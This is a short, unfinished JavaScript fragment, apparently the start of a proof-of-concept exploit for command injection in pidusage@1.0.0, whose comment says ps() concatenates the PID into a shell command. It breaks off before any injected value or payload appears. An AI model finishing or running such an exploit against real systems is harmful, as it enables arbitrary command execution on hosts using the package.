const pidusage = require('pidusage');

async function exploit() {
    // In pidusage@1.0.0, the main export is a constructor class. 
    // Instantiating it correctly binds us to the prototype where `.ps()` resides.
    const stat = new pidusage();

    // The vulnerable `ps()` implementation naively concatenates the PID into a shell command:
